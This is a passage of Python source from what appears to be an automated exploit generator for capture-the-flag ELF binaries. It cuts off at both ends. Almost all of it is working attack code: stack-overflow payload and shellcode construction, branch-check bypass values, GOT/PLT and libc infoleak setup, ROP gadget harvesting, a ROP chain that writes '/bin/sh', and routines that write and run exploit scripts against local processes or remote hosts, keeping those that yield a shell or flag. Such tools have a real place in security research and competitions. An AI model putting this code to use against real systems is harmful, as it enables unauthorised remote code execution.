	if shellcode_betwen_cmps == True or shellcodeAfterRet == True:
		payload_parts = payload_parts_generator(elf, stack_vuln)
		if shellcode_betwen_cmps == True:
			add_shellcode(payload_parts, data, offset_index)

		else:			add_shellcode(payload_parts, data, -1*get_arch_int_size(elf))

	else:
		payload_parts = PayloadParts()
		payload_parts.start = stack_vuln.overwriteable_vars[0]
		payload_parts.ret_address = [-stack_vuln.overwriteable_vars[0], "stack"]

		parts = []
		shellcode_part = Part()
		shellcode_part.type = bytes
		shellcode_part.region = None
		shellcode_part.offset = stack_vuln.overwriteable_vars[0]
		shellcode_part.value = data
		parts.append(shellcode_part)
		payload_parts.parts = parts

	return payload_parts

'''
+-----------------------------------------------------------+
|            Branch Analysis Stuff                          |
+-----------------------------------------------------------+
'''

CMP_PCODES_MAPPING = {'callind': 8, 'equal': 11, 'notequal': 12, 'sless': 13, 'slessequal': 14, 'less': 15, 'lessequal': 16}

def check_pass_value(check):
	check_type = check["branchType"]
	should_pass = check["desiredOutcome"]

	if check_type == CMP_PCODES_MAPPING['equal']:
		if should_pass == 0:
			return True
		elif should_pass == 1:
			return False
		elif should_pass == 2:
			return True

	elif check_type == CMP_PCODES_MAPPING['notequal']:
		if should_pass == 0:
			return False
		elif should_pass == 1:
			return True
		elif should_pass == 2:
			return False

	elif (check_type == CMP_PCODES_MAPPING['sless']) or (check_type == CMP_PCODES_MAPPING['slessequal']) or (check_type == CMP_PCODES_MAPPING['less']) or (check_type == CMP_PCODES_MAPPING['lessequal']):
		if should_pass == 0:
			return True
		elif should_pass == 1:
			return False
		elif should_pass == 2:
			return True

	elif check_type == "set":
		return True

def get_wrong_value(check):
	value = check["value"]
	check_type = check["branchType"]

	if check_type == CMP_PCODES_MAPPING['equal']:
		return value + 1

	elif check_type == CMP_PCODES_MAPPING['notequal']:
		#return value + 1
		return value

	elif check_type == CMP_PCODES_MAPPING["sless"]:
		return value - 1

	elif check_type == CMP_PCODES_MAPPING["slessequal"]:
		return value - 1

	elif check_type == CMP_PCODES_MAPPING["less"]:
		return value + 1

	elif check_type == CMP_PCODES_MAPPING["lessequal"]:
		return value + 1

def check_0_checks(checks):
	ret_checks = []
	for check in checks:
		if check["stackOffset"] > 0:
			ret_checks.append(check)
	return ret_checks

def get_pass_value(check):
	check_type = check["branchType"]
	check_val = check["value"]
	if check_type == "set":
		return check_val	

	elif (check_type == CMP_PCODES_MAPPING["equal"]):
		return check_val

	elif (check_type == CMP_PCODES_MAPPING["notequal"]):
		return check_val + 1

	elif (check_type == CMP_PCODES_MAPPING["sless"]) or (check_type == CMP_PCODES_MAPPING["slessequal"]):
		return check_val + 1

	elif (check_type == CMP_PCODES_MAPPING["less"]) or (check_type == CMP_PCODES_MAPPING["lessequal"]):
		return check_val - 1

def get_fail_value(check):
	check_type = check["branchType"]
	check_val = check["value"]
	if check_type == "set":
		return check_val

	elif (check_type == CMP_PCODES_MAPPING["equal"]):
		return check_val + 1

	elif (check_type == CMP_PCODES_MAPPING["notequal"]):
		return check_val

	elif (check_type == CMP_PCODES_MAPPING["sless"]) or (check_type == CMP_PCODES_MAPPING["slessequal"]):
		return check_val - 1

	elif (check_type == CMP_PCODES_MAPPING["less"]) or (check_type == CMP_PCODES_MAPPING["lessequal"]):
		return check_val + 1

def scale_num(x):
	return int(math.pow(2, x))

def get_check_permutation_value(totalPermutations, permutation, check_values):
	x = permutation
	true_checks = {}
	for i in range(len(check_values) - 1, -1, -1):
		y = scale_num(i)
		if (y <= x):
			true_checks[i] = True
			x = x - y
		else:
			true_checks[i] = False

	current_check_values = []
	for i in range(0, len(check_values)):
		currentCheck =check_values[i]
		next_value = Part()
		if true_checks[i] == True:
			next_value.value = currentCheck["pass"]
		else:
			next_value.value = currentCheck["fail"]
		next_value.size = currentCheck["size"]
		next_value.offset = currentCheck["offset"]
		next_value.type = int
		current_check_values.append(next_value)
	return current_check_values


def get_repeated_offsets(check_values):
	used_offsets = []
	repeated_offsets = []
	for check in check_values:
		check_offset = check["stackOffset"]
		if check_offset not in used_offsets:
			used_offsets.append(check_offset)
		else:
			repeated_offsets.append(check_offset)
	return repeated_offsets


def get_repeated_checks(checks, repeated_offsets):
	repeated_checks = {}
	for offset in repeated_offsets:
		repeated_checks[offset] = []
	for check in checks:
		check_offset = check["stackOffset"]
		if check_offset in repeated_offsets:
			repeated_checks[check_offset].append(check)
	repeated_check_count = 1
	for i in repeated_checks.values():
		repeated_check_count = repeated_check_count * len(i)
	return repeated_checks, repeated_check_count

def replace_repeated_checks(checks, repeated_checks, checkIteration, repeated_check_count):
	divisor = 1
	index = 0
	checks = []
	for i in repeated_checks.values():
		index = int((checkIteration / divisor)) % len(i)
		checks.append(i[index])
		divisor = divisor * len(i)
	return checks

def strip_checks(checks, offsets):
	returned_checks = []
	for check in checks:
		check_offset = check["stackOffset"]
		if check_offset not in offsets:
			returned_checks.append(check)
	return returned_checks

def insert_checks(checks, iteration_checks):
	for iteration_check in iteration_checks:
		checks.append(iteration_check)
	return checks

def get_cmp_values(checks):
	check_values = []
	for i in range(0, len(checks)):
		cmp_values = {}
		cmp_values["pass"] = get_pass_value(checks[i])
		cmp_values["fail"] = get_fail_value(checks[i])
		cmp_values["size"] = checks[i]["size"]
		cmp_values["offset"] = checks[i]["stackOffset"]
		check_values.append(cmp_values)
	return check_values

def get_check_values(checks):
	repeated_offsets = get_repeated_offsets(checks)
	if len(repeated_offsets) == 0:
		check_values = get_cmp_values(checks)
		return [check_values]
	else:
		repeated_checks, repeated_check_count = get_repeated_checks(checks, repeated_offsets)
		workingChecks = checks
		check_values = []
		for i in range(0, repeated_check_count):
			iteration_checks = replace_repeated_checks(checks, repeated_checks, i, repeated_check_count)
			workingChecks = strip_checks(workingChecks, repeated_offsets)
			workingChecks = insert_checks(workingChecks, iteration_checks)
			check_values.append(get_cmp_values(workingChecks))
		return check_values

def get_check_permutations(check_valueList):
	check_permutations = []
	for check_values in check_valueList:
		permutations = int(math.pow(2, len(check_values)))

		for i in range(0, permutations):
			current_check_values = get_check_permutation_value(permutations, i, check_values)
			check_permutations.append(current_check_values)
	return check_permutations

def get_payload_permutations(stackVuln, arch):
	checks = stackVuln.checks
	check_values = get_check_values(checks)
	check_permutations = get_check_permutations(check_values)
	payloads = []
	return check_permutations

'''
+-----------------------------------------------------------+
|            Exploit verification                           |
+-----------------------------------------------------------+
'''

def libc_verify_exploit(exploits, libc, elf_name, ip_port):
	if os.path.exists("pwned"):
		os.remove("pwned")
	for exploit in exploits:
		if "chall-test" in exploit:
			continue
		if os.path.exists(exploit):
			print("Testing exploit")
			os.system("python3 %s" % exploit)
			if os.path.exists("pwned"):
				os.remove("pwned")
				libc_solidify_exploit(exploit, libc, elf_name, ip_port)
				return True
		else:
			print("Exploit writing errors")
	else:
		return False

def finalize_libc_exploit(exploit_name):
	verified_exploit = open("%s" % (exploit_name), "r")
	final_exploit_name = "exploit.py"
	final_exploit = open(final_exploit_name, "w")
	for line in verified_exploit:
		if "78965412" in line:
			break
		final_exploit.write(line)

	final_exploit.write("target.interactive()")
	final_exploit.close()
	shutil.copyfile(final_exploit_name, "../../%s" % final_exploit_name)

	print("Exploit Successful: %s" % exploit_name)
	sys.exit(0)

def libc_solidify_exploit(exploit_name, libc, elf_name, ip_port):
	final_exploit_name = "exploit-%s.py" % libc
	tested_exploit = open(exploit_name, "r")
	exploit = open(final_exploit_name, "w")
	exploit.write("#!/usr/bin/env python3\n")
	for line in tested_exploit:
		if line[:3] == "gdb":
			continue
		if "process" in line:
			if ip_port != None:
				exploit.write('target = remote("%s", %s)\n' % (ip_port[0], ip_port[1]))
			else:
				exploit.write('target = process("./%s")\n' % elf_name)
		else:
			exploit.write(f"{line}")

	exploit.write('# End of exploitation78965412\n')

	exploit.write('time.sleep(.5)\n')

	exploit.write('target.sendline("w")\n')
	exploit.write('target.sendline("id")\n\n')

	exploit.write('output = b""\n')

	exploit.write('try:\n')
	exploit.write('\toutput += target.recvrepeat(1)\n')
	exploit.write('except:\n')
	exploit.write('\tprint("End of Output")\n\n')

	exploit.write('if (b"id" in output) or (b"user" in output):\n')
	exploit.write('\tprint("Exploit Successful15935728!")\n')
	exploit.write('sys.exit(0)')

	exploit.close()
	shutil.copyfile(final_exploit_name, "../%s/%s" % (LIBC_EXPLOITS_DIRECTORY_NAME, final_exploit_name))
	os.chmod("../%s/%s" % (LIBC_EXPLOITS_DIRECTORY_NAME, final_exploit_name), 0o777)

'''
+-----------------------------------------------------------+
|            Exploit generation Help                        |
+-----------------------------------------------------------+
'''

def get_got_addresses(elf_name):

	got_funcs = {}
	got_addresses =  str(subprocess.check_output(["objdump", "-R", elf_name]))
	got_addresses = got_addresses.split("\\n")

	funcsOfInterst = ["open", "fopen", "system", "gets", "read", "fgets", "__isoc99_scanf", "scanf", "printf", "exit", "puts", "__libc_start_main"]

	for gotAddressLine in got_addresses:
		if "R_386_JUMP_SLOT   " in gotAddressLine:
			gotFunction = gotAddressLine.split("R_386_JUMP_SLOT   ")[1]
			gotFunction = gotFunction.split("@GLIBC")[0]
			gotAddress = gotAddressLine.split("R_386_JUMP_SLOT")[0]
			gotAddress = int("0x" + gotAddress, 16)
			if (gotFunction in funcsOfInterst):
				got_funcs[gotFunction] = gotAddress
		if "R_386_GLOB_DAT    " in gotAddressLine:
			gotFunction = gotAddressLine.split("R_386_GLOB_DAT    ")[1]
			gotFunction = gotFunction.split("@GLIBC")[0]
			gotAddress = gotAddressLine.split("R_386_GLOB_DAT")[0]
			gotAddress = int("0x" + gotAddress, 16)

			if (gotFunction in funcsOfInterst):
				got_funcs[gotFunction] = gotAddress

		if "R_X86_64_GLOB_DAT  " in gotAddressLine:
			gotFunction = gotAddressLine.split("R_X86_64_GLOB_DAT  ")[1]
			gotFunction = gotFunction.split("@GLIBC")[0]
			gotAddress = gotAddressLine.split("R_X86_64_GLOB_DAT  ")[0]
			gotAddress = int("0x" + gotAddress, 16)

			if (gotFunction in funcsOfInterst):
				got_funcs[gotFunction] = gotAddress

	
		elif "R_X86_64_JUMP_SLOT  " in gotAddressLine:
			gotFunction = gotAddressLine.split("R_X86_64_JUMP_SLOT  ")[1]
			gotFunction = gotFunction.split("@GLIBC")[0]
			gotAddress = gotAddressLine.split("R_X86_64_JUMP_SLOT")[0]
			gotAddress = int("0x" + gotAddress, 16)
			if (gotFunction in funcsOfInterst):
				got_funcs[gotFunction] = gotAddress
	return got_funcs

def get_symbol(elf, symbol):
	try:
		return elf.symbols[symbol]
	except:
		try:
			symbol = bytes(symbol, 'utf-8')
			return elf.symbols[symbol]
		except:
			return None

def get_got(elf, elf_name, symbol):
	try:
		return elf.got[symbol]
	except:
		try:
			bytes_symbol = bytes(symbol, 'utf-8')
			return elf.got[bytes_symbol]
		except:
			try:
				got_addresses = get_got_addresses(elf_name)
				return got_addresses[symbol]
			except:
				return None

def correct_32_main_stack_vuln(stack_vuln, elf_name, pie_enabled):
	if pie_enabled == False:
		cmd = "check32_offset_main:%s" % hex(stack_vuln["address"])
	else:
		cmd = "check32_offset_mainPie:%s" % hex(stack_vuln["address"])
	actual_offset = command_dynamic_analyzer(cmd, elf_name)

	reported_offset = stack_vuln["overwriteableVars"][0]

	if reported_offset == "return_address":
		return
	if actual_offset is None:
		return

	if actual_offset != reported_offset:
		correction_offset = actual_offset - reported_offset

		# Implement for indirect ptrs, and checks
		new_stack_values = []
		stack_values = stack_vuln["overwriteableVars"]
		for stack_value in stack_values:
			if str(stack_value) == "return_address":
				new_stack_values.append("return_address")
			elif (stack_value + correction_offset) > 0:
				new_stack_values.append(stack_value + correction_offset)

		stack_vuln["overwriteableVars"] = new_stack_values

		for check in stack_vuln["checks"]:
			check["stackOffset"] = check["stackOffset"] + correction_offset

		new_called_ptrs = []
		for called_ptr in stack_vuln["calledPtrs"]:
			new_called_ptrs.append(called_ptr + correction_offset)

		stack_vuln["calledPtrs"] = new_called_ptrs

def correct_32_main_input(inp, elf_name, pie_enabled):
	if pie_enabled == False:
		cmd = "check32_offset_main:%s" % hex(inp["address"])
	else:
		cmd = "check32_offset_mainPie:%s" % hex(inp["address"])
	actual_offset = command_dynamic_analyzer(cmd, elf_name)
	if actual_offset is None:
		return	
	if actual_offset != inp["stackOffset"]:
		inp["stackOffset"] = actual_offset

		correction_offset = actual_offset - inp["stackOffset"]
		for check in inp["checks"]:
			check["stackOffset"] = check["stackOffset"] + correction_offset

		new_called_ptrs = []
		for called_ptr in inp["calledPtrs"]:
			new_called_ptrs.append(called_ptr + correction_offset)
		inp["calledPtrs"] = new_called_ptrs

def correct_32_main_printf(fmt_str_vuln, elf_name, pie_enabled):
	if pie_enabled == False:
		cmd = "check32_offset_main:%s" % hex(fmt_str_vuln.address)
	else:
		cmd = "check32_offset_mainPie:%s" % hex(fmt_str_vuln.address)		
	actual_offset = command_dynamic_analyzer(cmd, elf_name)
	if actual_offset != fmt_str_vuln.stack_offset:
		fmt_str_vuln.stack_offset = actual_offset

def correct_32_main_infoleak(infoleak, elf_name, pie_enabled):
	if pie_enabled == False:
		cmd = "check32_offset_main:%s" % hex(infoleak["address"])
	else:
		cmd = "check32_offset_mainPie:%s" % hex(infoleak["address"])
	actual_offset = command_dynamic_analyzer(cmd, elf_name)
	if actual_offset != infoleak["offset"]:
		infoleak["offset"] = actual_offset

def setup_stack_shellcode_infoleak(infoleak_vuln, exploit_name, shiftedOffset = None):
	fmt_index = infoleak_vuln.fmt_index
	str0, str1 = parse_infoleak_fmt_string(infoleak_vuln.string, fmt_index, exploit_name)

	if len(str0) > 0 and len(str1) > 0:
		exploit_write('target.recvuntil("%s")' % str0, exploit_name)
		exploit_write('leak = int(target.recvuntil(b"%s").strip(b"%s"), 16)' % (str1, str1), exploit_name)

	if len(str0) > 0 and len(str1) == 0:
		exploit_write('target.recvuntil("%s")' % str0, exploit_name)
		exploit_write('leak = int(target.recvline().strip(b"\\n"), 16)', exploit_name)

	if (infoleak_vuln.function == infoleak_vuln.calling_function == infoleak_vuln.address == None):
		printf_infoleak = infoleak_vuln.offset
	else:
		printf_infoleak = infoleak_vuln.offset

	if shiftedOffset != None and shiftedOffset != 0:
		printf_infoleak += shiftedOffset
	exploit_write('ret_address = leak + (%d)' % printf_infoleak, exploit_name)
	exploit_write('bof_payload.add_base("stack", ret_address)\n', exploit_name)



def setup_pie_infoleak(infoleak_vuln, exploit_name):
	
	fmt_index = infoleak_vuln.fmt_index
	str0, str1 = parse_infoleak_fmt_string(infoleak_vuln.string, fmt_index, exploit_name)

	if len(str0) > 0 and len(str1) > 0:
		exploit_write('target.recvuntil("%s")' % str0, exploit_name)
		exploit_write('leak = int(target.recvuntil(b"%s").strip(b"%s"), 16)' % (str1, str1), exploit_name)

	if len(str0) > 0 and len(str1) == 0:
		exploit_write('target.recvuntil("%s")' % str0, exploit_name)
		exploit_write('leak = int(target.recvline().strip(b"\\n"), 16)', exploit_name)

	offset = infoleak_vuln.offset
	exploit_write('pie_base = leak - (%d)' % offset, exploit_name)
	exploit_write('bof_payload.add_base("pie", pie_base)', exploit_name)

def setup_libc_infoleak(infoleak_vuln, libc, exploit_name):
	fmt_index = infoleak_vuln.fmt_index

	str0, str1 = parse_infoleak_fmt_string(infoleak_vuln.string, fmt_index, exploit_name)

	if len(str0) > 0 and len(str1) > 0:
		exploit_write('target.recvuntil("%s")' % str0, exploit_name)
		exploit_write('leak = int(target.recvuntil(b"%s").strip(b"%s"), 16)' % (str1, str1), exploit_name)

	if len(str0) > 0 and len(str1) == 0:
		exploit_write('target.recvuntil("%s")' % str0, exploit_name)
		exploit_write('leak = int(target.recvline().strip(b"\\n"), 16)', exploit_name)

	symbol = infoleak_vuln.offset

	offset = get_symbol(libc, symbol)
	exploit_write('libc_base = leak - (%d)' % offset, exploit_name)
	exploit_write('bof_payload.add_base("libc", libc_base)', exploit_name)
	exploit_write('print("libcBase is: %s" % hex(libc_base))', exploit_name)

def filter_canaries(stack_vulns):
	for i in range(0, len(stack_vulns)):
		cmps = stack_vulns[i].checks
		stack_vulns[i].checks = cmps[:(len(cmps) - 1)]
	return stack_vulns

def prep_stack_vuln(stack_vuln):
	stack_vuln.checks = sorted(stack_vuln.checks, key = lambda x: x["stackOffset"], reverse=True)

def strip_repeated_checks(stack_vuln):
	checks = []
	offsets = []
	for check in stack_vuln.checks:
		checkOffset = check["stackOffset"]
		if checkOffset not in offsets:
			checks.append(check)
			offsets.append(checkOffset)
	return checks

def prep_indirect_call(elf, stack_vuln, winFunc, offset, region=None):
	prep_stack_vuln(stack_vuln)
	ptrSize = get_arch_int_size(elf)
	startOffset = offset
	endOffset = startOffset + ptrSize

	checks = stack_vuln.checks

	actualChecks = []

	indirectCall = {}
	indirectCall["stackOffset"] = offset
	indirectCall["value"] = winFunc
	indirectCall["desiredOutcome"] = "set"
	indirectCall["branchType"] = 11
	indirectCall["size"] = ptrSize

	if region != None:
		indirectCall["region"] = region
	else:
		indirectCall["region"] = None

	placedIndirectCall = False

	for check in checks:
		checkStart = check["stackOffset"]
		checkEnd = check["stackOffset"] + ptrSize
		if (startOffset == checkStart) or (endOffset == checkEnd):
			continue
		if (startOffset < checkStart < endOffset) or (startOffset < checkEnd < endOffset):
			continue
		if (checkStart > endOffset) and (placedIndirectCall == False):
			actualChecks.append(indirectCall)
			placedIndirectCall = True
		actualChecks.append(check)

	if placedIndirectCall == False:
		actualChecks.append(indirectCall)

	returnstack_vuln = stack_vuln
	returnstack_vuln.checks = actualChecks

	return returnstack_vuln

def verify_argv_exploit(exploit):
	proc = subprocess.Popen(["python3", exploit], stdout=subprocess.PIPE)
	output = str(proc.communicate())
	output = output.replace("\\n", "")

	if "flag{" in output:
		print("\n\nExploit Successful: %s\n\n" % str(exploit))
		finalize_argv_exploit(exploit)
		sys.exit(0)

def payload_parts_generator(elf, stack_vuln, fill=False):
	prep_stack_vuln(stack_vuln)

	# Filter the checks
	checks = check_0_checks(strip_repeated_checks(stack_vuln))

	payload_parts = PayloadParts()

	payload_parts.start = stack_vuln.overwriteable_vars[0]

	parts = []
	for i  in range(0, len(checks)):
		next_value = Part()
		next_value.type = int	
		next_value.region = None
		if checks[i]["desiredOutcome"] == "set":
			next_value.region = checks[i]["region"] 
			next_value.value = checks[i]["value"]								
		elif check_pass_value(checks[i]) == True:
			next_value.value = checks[i]["value"]	
		else:
			next_value.value = get_wrong_value(checks[i])	
		next_value.size = checks[i]["size"]
		next_value.offset = checks[i]["stackOffset"]
		parts.append(next_value)

	if fill:
		write_size = stack_vuln.write_size
		part = Part()
		part.type = int
		part.region = None
		part.offset = - 8 - write_size
		part.value = 0
		part.size = 4
		parts.append(part)

	payload_parts.parts = parts
	payload_parts.ret_address = None
	return payload_parts

def strip_ret_address_checks(checks):
	retChecks = []
	for check in checks:
		if check["stackOffset"] != 0:
			retChecks.append(check)
	return retChecks

def get_writeable_indirect_ptrs(stack_vuln):
	if type(stack_vuln.called_ptrs) != list:
		stack_vuln.called_ptrs = [stack_vuln.called_ptrs]

	if stack_vuln.write_size == None:
		indirect_ptrs = stack_vuln.called_ptrs
	else:
		if 'return_address' in stack_vuln.overwriteable_vars:
			indirect_ptrs = stack_vuln.called_ptrs
		else:
			startOffset = stack_vuln.overwrite_vars[0]
			writeSize = stack_vuln.write_size
			maxWrite = (startOffset - writeSize)
			canidateIndirect_ptrs = stack_vuln.called_ptrs
			indirect_ptrs = []
			for ptr in canidateIndirect_ptrs:
				if ptr > maxWrite:
					indirect_ptrs.append(ptr)
	return indirect_ptrs

def prep_output_file():
	cwd = "%s/" % os.getcwd()
	file_name = "%sbrave_this_storm" % cwd
	if os.path.exists(file_name):
		os.remove(file_name)
	return file_name

def grab_info_from_output_file(output_file_name):
	try:
		output_file = open(output_file_name, "rb")
		info = pickle.load(output_file)
		return info
	except:
		return None

def command_dynamic_analyzer(cmd, elf_name):
	output_file = prep_output_file()
	cmd = "python3 " + INSTALL_DIR + DYNAMIC_ANALYZER_NAME + " -c " + cmd + " -b " + elf_name + " -o " + output_file

	os.system(cmd)
	output = grab_info_from_output_file(output_file)
	return output

'''
+-----------------------------------------------------------+
|                 rop gadget helper functions               |
+-----------------------------------------------------------+
'''


def get_plt_system_address(elf_name):
	dissassembly =  str(subprocess.check_output(["objdump", "-D", elf_name])).split("\\n")
	for dissLine in dissassembly:
		if (" <system@plt>" in dissLine) and ("\\t" not in dissLine):
			plt_system = int("0x%s" % (dissLine.split(" <system@plt>")[0]), 16)
			return plt_system

def get_oneshot_gadgets(libc_name):
	oneshot_gadgets = []
	oneshot_output = str(subprocess.check_output(["one_gadget", libc_name])).split("\\n")
	for line in oneshot_output:
		if ("execve" in line):
			address = line.split(" execve")[0]
			address = address.split("0x")[1]
			address = int("0x%s"%address, 16)
			oneshot_gadgets.append(address)
	return oneshot_gadgets

def get_write_gadget(elf, pop_gadgets = None):
	if elf.arch == "amd64":
		ptr_string = ": mov qword ptr ["

	elif elf.arch == "i386":
		ptr_string = ": mov dword ptr ["

	gadgets_file = open("gadgets", "r")
	for line in gadgets_file:
		try:
			if len(line.split(" : ")) != 2:
				continue
			if ptr_string not in line:
				continue
			if len(line.split(";")) != 2:
				continue
			if "ret" not in line.split(";")[1]:
				continue
			if "rip" in line:
				continue
			if "[0x" in line:
				continue 
			if ", 0x" in line:
				continue
			if "+" in line:
				continue
			if "-" in line:
				continue

			r0 = line.split("ptr [")[1].split("]")[0]
			r1 = line.split("], ")[1].split(" ; ret")[0]
			gadget = int(line.split(" : ")[0], 16)

			if pop_gadgets == None:
				return r0, r1, gadget

			elif (r0 in pop_gadgets.keys()) and (r1 in pop_gadgets.keys()):
				return r0, r1, gadget				
		except:
			i = 1

def get_pop_gadgets():
	gadgets_file = open("gadgets", "r")
	pop_gadgets = {}
	for line in gadgets_file:
		try:
			if len(line.split(" : ")) != 2:
				continue

			if len(line.split(";")) != 2:
				continue

			if "pop " not in line:
				continue

			if "ret\n" not in line:
				continue

			register = line.split("pop ")[1].split(" ; ret")[0]
			gadget = int(line.split(" : ")[0], 16)
			pop_gadgets[register] = gadget
		except:
			i = 1
	return pop_gadgets

def get_bin_sh(elf_name):
	elf = ELF(elf_name)
	file = open(elf_name, "rb")
	fileContents = file.read()

	for string in BIN_SH_STRINGS:
		if string in fileContents:
			return fileContents.find(string) + elf.address

def grab_gadgets(elf_name):
	if os.path.exists("gadgets"):
		os.remove("gadgets")
	os.system("python3 %sROPgadget.py --binary %s > gadgets" % (ROPGADGET_DIR, elf_name))

def get_gadget(ins):
	gadgets_file = open("gadgets", "r")
	for line in gadgets_file:
		try:
			if len(line.split(" : ")) > 1:
				if line.split(" : ")[1].strip("\n") == ins:
					return int(line.split(" : ")[0].strip("\n"), 16)
		except:
			i = 1

def get_arch_int_size(elf):
	if elf.arch == "i386":
		return 4
	elif elf.arch == "amd64":
		return 8

def prep_rop_write_binsh(address, elf):
	if elf.arch == "amd64":
		pop_gadgets = get_pop_gadgets()

		register0, register1, gadget = get_write_gadget(elf, pop_gadgets)

		payload_parts = []

		# Prep first register with address to write
		payload_parts.append(pop_gadgets[register0])
		payload_parts.append(address)

		# Prep second register with /bin/sh
		payload_parts.append(pop_gadgets[register1])
		payload_parts.append(b"/bin/sh\x00")

		# Execute write
		payload_parts.append(gadget)

		return payload_parts

	elif elf.arch == "i386":
		print("Attack Not Supported yet for x86")
		sys.exit(0)

'''
+-----------------------------------------------------------+
|            ret2libc attack helper functions               |
+-----------------------------------------------------------+
'''

def finalize_single_libc_exploit(exploit_name):
	final_exploit_name = "verfied-%s" % exploit_name
	tested_exploit = open(exploit_name, "r")
	exploit = open(final_exploit_name, "w")
	for line in tested_exploit:
		if line[:3] == "gdb":
			exploit.write(line.split(',')[0] + ")\n")
		elif line.strip("\n") == "time.sleep(.5)":
			exploit.write("\ntarget.interactive()\n")
		else:
			exploit.write(f"{line}")

	exploit.close()
	shutil.copyfile(final_exploit_name, "../../%s" % final_exploit_name)
	print("\n\nExploit Successful: %s\n\n" % str(exploit_name))
	sys.exit(0)

def test_libc_exploits(exploits):
	for exploit in exploits:
		if os.path.exists(exploit):		
			os.system("python3 %s" % exploit)
			if os.path.exists("pwned"):
				os.remove("pwned")
				finalize_single_libc_exploit(exploit)
	return None

def get_main(elf_name):
	dissassembly =  str(subprocess.check_output(["objdump", "-D", elf_name])).split("\\n")

	address = None
	for disLine in dissassembly:
		if ("<main>:") in disLine:
			address = ("0x%s" % disLine.split((" <main>:"))[0])
			address = int(address, 16)

	if address == None:
		main = command_dynamic_analyzer("get_main", elf_name)
		address = int(main, 16)

	return address

def get_patched_elf_name_main(elf_name):
	current_directory = os.getcwd()
	os.chdir("../")
	main = get_main(elf_name)
	os.chdir(current_directory)
	return main

def setup_puts_infoleak(elf_name, elf, stack_vuln, plt_funcs, callMain = False):
	payload_parts = payload_parts_generator(elf, stack_vuln)
	got_addresses = get_got_addresses(elf_name)

	rop_chain = []
	if elf.arch == "amd64":
		grab_gadgets(elf_name)

		gadget = get_gadget("pop rdi ; ret")

		rop_chain.append(gadget)

		rop_chain.append(got_addresses["puts"])
		rop_chain.append(plt_funcs["puts"])
		if callMain == True:
			main = get_patched_elf_name_main(elf_name)
			rop_chain.append(main)

	elif elf.arch == "i386":
		rop_chain.append(plt_funcs["puts"])
		if callMain == True:
			main = get_patched_elf_name_main(elf_name)
			rop_chain.append(main)
		else:
			rop_chain.append(b"0000")

		rop_chain.append(got_addresses["puts"])
	payload_parts.set_rop_chain(rop_chain)
	payload_parts.construct_payload(elf, "fillerInputGrab")

def setup_puts_infoleak(elf_name, elf, stack_vuln, plt_funcs, exploit_name, callMain = False):
	payload_parts = payload_parts_generator(elf, stack_vuln)

	got_addresses = get_got_addresses(elf_name)

	rop_chain = []
	if elf.arch == "amd64":
		grab_gadgets(elf_name)
		gadget = get_gadget("pop rdi ; ret")

		rop_chain.append(gadget)

		rop_chain.append(got_addresses["puts"])
		rop_chain.append(plt_funcs["puts"])
		if callMain == True:
			main = get_patched_elf_name_main(elf_name)
			rop_chain.append(main)

	elif elf.arch == "i386":
		rop_chain.append(plt_funcs["puts"])
		if callMain == True:
			main = get_patched_elf_name_main(elf_name)
			rop_chain.append(main)
		else:
			rop_chain.append(b"0000")

		rop_chain.append(got_addresses["puts"])

	payload_parts.set_rop_chain(rop_chain)
	payload_parts.construct_payload(elf, exploit_name)

def get_filler_input(elf_name, elf, stack_vuln, plt_funcs, libc_name=None):
	if elf.arch == "amd64":
		x = 'foundEnd = False\noutput = b""\nwhile foundEnd == False:\n\ttry:\n\t\toutput += target.recvline()\n\texcept:\n\t\tfoundEnd = True\nif len(output) == 0:\n\t\t\n\t\toutput_file = open("justifies", "w")\n\t\toutput_file.write("")\n\t\toutput_file.close()\n\t\tsys.exit(0)\n\nputsFile = open("far-cry", "r")\nputsAddress = putsFile.read()\nputsFile.close()\nputsAddress = int(putsAddress, 16)\noutputLines = output.split(b"\\n")\nif len(outputLines) == 1:\n\tleakLine = outputLines[0]\nelse:\n\tleakLine = outputLines[-2]\nworkingLeakLine = leakLine.strip(b"\\n")\nlineLength = 8\nif len(workingLeakLine) < 8:\n\tlineLength = len(workingLeakLine)\nhexValues = []\n\nfor i in range(1, lineLength + 1):\n\t\tcurrentLeak = workingLeakLine[-i:]\n\n\t\tcurrentAddress = u64(currentLeak + b"\\x00"*(8-len(currentLeak)))\n\t\tprint(hex(currentAddress))\n\t\tif currentAddress == putsAddress:\n\t\t\tsavedIndex = i\n\t\t\tbreak\nfinalFiller_output = leakLine[:-savedIndex]\nfiller_output = outputLines[:-2]\nfiller_output.append(finalFiller_output)\nfiller_output = b"\\\\n".join(filler_output)\noutput_file = open("justifies", "wb")\noutput_file.write(filler_output)\noutput_file.close()\n'
	elif elf.arch == "i386":
		x = '# Function to parse out last bit of output\ndef getLastInput(line, address):\n\t\ti = 0\n\t\tfound = False\n\t\twhile found == False:\n\t\t# Check if we found the spot of the libc puts infoleak\n\t\t\t\tif ((line[i] == (address & 0xff)) and (line[i + 1] == ((address & 0xff00) >> 8)) and (line[i + 2] == ((address & 0xff0000) >> 16)) and (line[i + 3] == ((address & 0xff000000) >> 24))):\n\t\t\t\t\tfound = True\n\t\t\t\ti += 1\n\n\t\t# Return the output text before the leak\n\t\tremainderOutput = ""\n\t\tif i != 0:\n\t\t\tremainderOutput = line[0:(i - 1)]\n\t\treturn remainderOutput\n\n# Helper function to report filler Output\ndef report(filler_output):\n\toutput_file = open("justifies", "wb")\n\toutput_file.write(filler_output)\n\toutput_file.close()\n\tsys.exit(0)\n\n# Scan in all of the input\nfoundEnd = False\noutput = b""\nwhile foundEnd == False:\n\ttry:\n\t\toutput += target.recvline()\n\texcept:\n\t\tfoundEnd = True\n\n# Pause to wait for gdb script\ntime.sleep(.5)\n\n# Scan in the puts address\nputsFile = open("far-cry", "r")\nputsAddress = putsFile.read()\nputsFile.close()\nputsAddress = int(putsAddress, 16)\n\n\n# Break up the input by newline characters\noutputLines = output.split(b"\\n")\n# Early termination if there is little output\nif len(outputLines) == 2:\n\tfinalOutput = getLastInput(outputLines[0], putsAddress)\n\treport(finalOutput)\n\n# Parse out the filler output\nfiller_output = outputLines[:-2]\nfiller_output = b"\\\\n".join(filler_output)\nfiller_output += b"\\\\n"\n\n# Append the final output\nfinalOutput = getLastInput(outputLines[-2], putsAddress)\nfiller_output = filler_output + finalOutput\n\nreport(filler_output)\n\n'

	exploit_name = setup_filler_exploit(elf_name, elf, libc_name)

	payload_parts = payload_parts_generator(elf, stack_vuln)

	setup_puts_infoleak(elf_name, elf, stack_vuln, plt_funcs, exploit_name)

	exploit_write(x, exploit_name)

	os.system("python3 binded-in-chains.py")

	try:
		filler_output_file = open("justifies", "r", encoding='utf-8', errors='ignore')
		filler_ouput = filler_output_file.read()
